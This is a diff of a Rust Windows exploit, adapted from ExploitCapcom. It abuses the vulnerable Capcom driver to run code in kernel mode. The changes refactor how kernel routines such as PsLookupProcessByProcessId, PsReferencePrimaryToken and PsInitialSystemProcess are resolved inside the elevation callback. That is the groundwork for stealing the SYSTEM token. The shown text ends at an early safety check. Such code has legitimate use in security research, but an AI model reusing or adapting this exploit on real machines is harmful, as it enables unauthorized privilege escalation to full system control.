@@ -10,7 +10,7 @@ Adapted from https://github.com/tandasat/ExploitCapcom
 use std::{mem, ptr};
 
 use winapi::shared::minwindef::{FALSE};
-use winapi::shared::ntdef::{UNICODE_STRING, PVOID, NTSTATUS, HANDLE};
+use winapi::shared::ntdef::{PVOID, NTSTATUS, HANDLE};
 use winapi::um::winnt::{PACCESS_TOKEN};
 use winapi::um::winbase::{CREATE_NEW_CONSOLE};
 use winapi::um::processthreadsapi::{CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION};
@@ -18,8 +18,6 @@ use winapi::um::processenv::{GetCommandLineW};
 use winapi::um::shellapi::{CommandLineToArgvW};
 
 use obfstr::wide;
-
-use capcom0::get_system_routine_address;
 
 type PEPROCESS = PVOID;
 
@@ -29,24 +27,17 @@ fn main() {
 		unsafe {
 			#[allow(non_snake_case)]
 			device.elevate(|ctx| {
-				let PsGetCurrentProcessId = get_system_routine_address!(ctx,
-					unsafe extern "system" fn() -> HANDLE,
-					wide!("PsGetCurrentProcessId"));
-				let PsLookupProcessByProcessId = get_system_routine_address!(ctx,
-					unsafe extern "system" fn(HANDLE, *mut PEPROCESS) -> NTSTATUS,
-					wide!("PsLookupProcessByProcessId"));
-				let ObDereferenceObject = get_system_routine_address!(ctx,
-					unsafe extern "system" fn(PVOID),
-					wide!("ObDereferenceObject"));
-				let PsReferencePrimaryToken = get_system_routine_address!(ctx,
-					unsafe extern "system" fn(PEPROCESS) -> PACCESS_TOKEN,
-					wide!("PsReferencePrimaryToken"));
-				let PsDereferencePrimaryToken = get_system_routine_address!(ctx,
-					unsafe extern "system" fn(PACCESS_TOKEN),
-					wide!("PsDereferencePrimaryToken"));
-				let SystemProcess = *get_system_routine_address!(ctx,
-					*mut PEPROCESS,
-					wide!("PsInitialSystemProcess"));
+				let PsGetCurrentProcessId: unsafe extern "system" fn() -> HANDLE =
+					ctx.get_system_routine_address(wide!("PsGetCurrentProcessId"));
+				let PsLookupProcessByProcessId: unsafe extern "system" fn(HANDLE, *mut PEPROCESS) -> NTSTATUS =
+					ctx.get_system_routine_address(wide!("PsLookupProcessByProcessId"));
+				let ObDereferenceObject: unsafe extern "system" fn(PVOID) =
+					ctx.get_system_routine_address(wide!("ObDereferenceObject"));
+				let PsReferencePrimaryToken: unsafe extern "system" fn(PEPROCESS) -> PACCESS_TOKEN =
+					ctx.get_system_routine_address(wide!("PsReferencePrimaryToken"));
+				let PsDereferencePrimaryToken: unsafe extern "system" fn(PACCESS_TOKEN) =
+					ctx.get_system_routine_address(wide!("PsDereferencePrimaryToken"));
+				let SystemProcess = *ctx.get_system_routine_address::<*mut PEPROCESS>(wide!("PsInitialSystemProcess"));
 
 				// Early safety check...
 				if SystemProcess == ptr::null_mut() {
